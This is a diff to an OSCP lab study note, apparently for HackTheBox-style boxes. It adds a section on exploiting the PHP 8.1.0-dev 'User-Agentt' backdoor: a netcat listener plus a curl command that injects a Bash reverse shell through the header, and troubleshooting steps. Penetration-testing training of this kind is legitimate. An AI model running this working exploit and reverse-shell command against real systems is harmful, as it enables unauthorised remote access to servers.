@@ -140,6 +140,30 @@ python3 $BoxDir/loot/$Exploit.py $BoxIP $Port
 - [[OSCP/BOXES/WRITE UPS/Linux/Traceback|Traceback]] -- SmEvK Console command execution was URL-encoded and converted into a Bash reverse shell
 - [[OSCP/BOXES/WRITE UPS/Linux/Traverxec|Traverxec]] -- Nostromo command execution was verified with `id` before catching a `www-data` callback
 - [[OSCP/BOXES/WRITE UPS/Linux/SolidState|SolidState]] -- authenticated James file write placed a login-triggered callback in `/etc/bash_completion.d`
+- [[OSCP/BOXES/WRITE UPS/Linux/Knife|Knife]] -- PHP `User-Agentt` command execution was proved with `id` before a Bash callback
+
+## PHP 8.1.0-dev `User-Agentt` callback
+
+After the harmless `id` proof from [[Linux - Web Enum]], reuse the same header to launch Bash. The callback port is the local listener port, not the target web port.
+
+Terminal 1, on Kali:
+
+```bash
+nc -lvnp "$Lport"
+```
+
+Terminal 2, on Kali:
+
+```bash
+curl --max-time 10 -fsS \
+  -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/$LocalIP/$Lport 0>&1'\");" \
+  "http://$BoxIP:$WebPort/" >/dev/null
+```
+
+Run `id`, `whoami`, and `hostname` immediately after the callback. If the shell is raw, continue to Step 12 · [[Linux - Shell Stabilise]].
+
+> [!warning] 💡
+> `User-Agentt` is intentionally misspelled. If the harmless proof works but the callback does not, check `$LocalIP`, listener state, Bash availability, and header quoting in that order.
 
 ## Related stages
 
